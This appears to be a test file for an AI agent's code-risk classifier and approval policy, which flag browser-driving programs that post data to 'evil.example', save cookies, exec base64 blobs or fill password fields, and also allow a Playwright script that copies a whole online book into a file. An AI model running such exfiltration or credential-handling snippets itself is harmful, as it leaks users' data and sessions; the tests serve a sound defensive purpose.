import assert from 'node:assert/strict';
import { test } from 'node:test';
import { programRisk, siteOf, type BrowserPage, type BrowserPolicy, type BrowserPort, type ExecRequest, type SandboxPort } from '../src/index.js';
import { model, ScriptedProvider, setup, text, toolCall } from './helpers.js';

const user = (content: string) => ({ role: 'user' as const, content });
const lastTool = (p: ScriptedProvider, n = 1) => p.requests[n]!.messages.at(-1)!.content;
const tick = () => new Promise((r) => setTimeout(r, 20));

/** A program that reads a whole book in its own browser and writes it to a file, page after page. */
const READER = `import os
from playwright.sync_api import sync_playwright
with sync_playwright() as p:
    browser = p.chromium.connect_over_cdp(os.environ["STUDYHAWK_BROWSER"])
    page = browser.contexts[0].new_page()
    page.goto("https://reader.example.com/book/1")
    with open("Books/Book.md", "w") as out:
        for i in range(600):
            out.write(page.locator(".page-text").inner_text() + "\\n\\n")
            nxt = page.locator("[aria-label^='Next page']")
            if nxt.is_disabled():
                break
            nxt.click()
            page.wait_for_timeout(1500)
`;

test('programRisk: reading the declared sites into files is routine; the rest asks', () => {
  assert.equal(programRisk(READER, ['reader.example.com']).level, 'routine');
  const cases: [string, RegExp][] = [
    ['import requests\nrequests.post("https://evil.example", data=text)', /network/],
    ['ctx.storage_state(path="s.json")', /cookies/],
    ['page.goto("https://evil.example/collect")', /evil\.example, which it did not declare/],
    ['page.locator("form").evaluate("f => f.submit()")', /sends a form/],
    ['page.keyboard.press("Enter")', /sends a form/],
    ['exec(base64.b64decode(blob))', /builds/],
    ['page.click("text=Pay now")', /names "Pay now"/],
    ['page.fill("input[type=password]", "x")', /password/],
  ];
  for (const [code, reason] of cases) {
    const risk = programRisk(code, ['reader.example.com']);
    assert.equal(risk.level, 'sensitive', code);
    assert.match(risk.reason, reason, code);
  }
  assert.match(programRisk('print("ana.perez@uni.edu")', ['reader.example.com'], ['ana.perez@uni.edu']).reason, /email address/);
  assert.equal(siteOf('https://www.Reader.example.com/book/1'), 'reader.example.com');
  assert.equal(siteOf('not a site'), null);
});

class Sandbox implements SandboxPort {
  requests: ExecRequest[] = [];
  async describe() {
    return 'Python 3.12';
  }
  async exec(_u: string, request: ExecRequest) {
    this.requests.push(request);
    return { exitCode: 0, stdout: 'saved 525 pages', stderr: '', timedOut: false, durationMs: 1000 };
  }
}

class Browser implements BrowserPort {
  page(): BrowserPage {
    return { url: 'https://reader.example.com', title: 'Book', snapshot: '' };
  }
  async open() {
    return this.page();
  }
  async snapshot() {
    return this.page();
  }
  async act() {
    return this.page();
  }
  async screenshot() {
    return { path: 'x.png' };
  }
  async currentUrl() {
    return null;
  }
  async close() {}
}

/** Like StudyHawk: Canvas blocked, routine allowed, sensitive asks. */
const policy: BrowserPolicy = async (_u, url, _kind, context) => {
  if (new URL(url).hostname.endsWith('instructure.com')) return { block: 'Never on Canvas.' };
  return context?.risk.level === 'routine' ? 'allow' : 'approve';
};

test('code_run with browser_sites: a reading program runs freely and gets its browser; a risky one asks with its code', async () => {
  const sandbox = new Sandbox();
  const { agent, stores, sink } = setup({ sandbox, browser: new Browser(), browserPolicy: policy });
  const p = new ScriptedProvider([
    () => toolCall('code_run', { code: READER, browser_sites: ['https://www.reader.example.com/book'] }, 'a'),
    () => toolCall('code_run', { code: 'import requests\nrequests.post("https://evil.example")', browser_sites: ['reader.example.com'] }, 'b'),
    () => toolCall('code_run', { code: 'print(1)' }, 'c'),
    () => text('done'),
  ]);
  const run = agent.run({ runId: 'r1', model: model(p), history: [user('save the book')], sink });
  while (stores.runs.created.length === 0) await tick();
  const approval = stores.runs.created[0]!;
  assert.equal(approval.summary, 'Run a program that uses your browser on reader.example.com (talks to the network outside the browser)');
  assert.match(String(approval.details?.code), /requests\.post/);
  stores.runs.decide(approval.id, 'rejected');
  await run;
  assert.equal(stores.runs.created.length, 1, 'the reading program and plain code did not ask');
  assert.deepEqual(sandbox.requests.map((r) => r.browser), [{ sites: ['reader.example.com'] }, undefined]);
  assert.match(lastTool(p, 1), /saved 525 pages/);
});

test('code_run with browser_sites: Canvas is refused, bad sites are refused, and nobody-to-approve runs only allowed sites', async () => {
  const sandbox = new Sandbox();
  const { agent, sink } = setup({ sandbox, browser: new Browser(), browserPolicy: policy });
  const p = new ScriptedProvider([
    () => toolCall('code_run', { code: 'print(1)', browser_sites: ['fgcu.instructure.com'] }, 'a'),
    () => toolCall('code_run', { code: 'print(1)', browser_sites: ['not a site'] }, 'b'),
    () => text('ok'),
  ]);
  await agent.run({ runId: 'r1', model: model(p), history: [user('x')], sink });
  assert.match(lastTool(p, 1), /Never on Canvas/);
  assert.match(lastTool(p, 2), /not a site name/);

  const q = new ScriptedProvider([() => toolCall('code_run', { code: READER, browser_sites: ['reader.example.com'] }, 'a'), () => text('ok')]);
  await agent.run({ runId: 'r2', model: model(q), history: [user('x')], sink, kind: 'scheduled' });
  assert.match(lastTool(q), /needs the user here/);
  assert.equal(sandbox.requests.length, 0);
});
